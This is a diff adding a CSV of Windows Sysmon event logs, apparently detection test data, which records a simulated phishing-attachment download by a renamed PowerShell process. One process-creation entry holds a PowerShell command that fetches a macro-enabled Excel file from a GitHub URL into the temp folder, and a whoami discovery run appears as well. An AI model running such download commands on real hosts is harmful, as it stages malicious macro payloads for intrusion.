@@ -1,0 +1,16 @@
+process,winlog,@timestamp,file
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.117Z,{'path': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.379Z,{'path': 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpClient.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.132Z,{'path': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\3597805b7d7dce423abb491985dd28e8\\mscorlib.ni.dll'}
+{'name': 'ps_script.exe'},{'task': 'File created (rule: FileCreate)'},2025-03-26T17:13:11.064Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive'}
+"{'parent': {'name': 'ps_script.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ps_script.exe"" '}, 'name': 'ps_script.exe', 'command_line': '""ps_script.exe"" & {$url = \'https://github.com/RuaasSyaco/project_teste/raw/master/testess/12311/bin/abcoaAttachment.xlsm\'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\abcoaAttachment.xlsm}'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:13:08.896Z,
+"{'parent': {'name': 'ps_script.exe', 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ps_script.exe"" '}, 'name': 'whoami.exe', 'command_line': '""C:\\Windows\\system32\\whoami.exe""'}",{'task': 'Process Create (rule: ProcessCreate)'},2025-03-26T17:13:08.592Z,
+{'name': 'ps_script.exe'},{'task': 'File created (rule: FileCreate)'},2025-03-26T17:13:09.211Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zcwitjyo.doq.ps1'}
+{'name': 'ps_script.exe'},{'task': 'File created (rule: FileCreate)'},2025-03-26T17:13:10.694Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Temp\\PhishingAttachment.xlsm'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.194Z,{'path': 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpOAV.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.117Z,{'path': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.151Z,{'path': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\8861280fa67d054530cfebe1fa86e29f\\System.Management.Automation.ni.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.243Z,{'path': 'C:\\Windows\\System32\\urlmon.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.101Z,{'path': 'C:\\Windows\\System32\\mscoree.dll'}
+{'name': 'ps_script.exe'},{'task': 'Image loaded (rule: ImageLoad)'},2025-03-26T17:13:09.318Z,{'path': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll'}
+{'name': 'ps_script.exe'},{'task': 'File Delete archived (rule: FileDelete)'},2025-03-26T17:13:09.256Z,{'path': 'C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zcwitjyo.doq.ps1'}
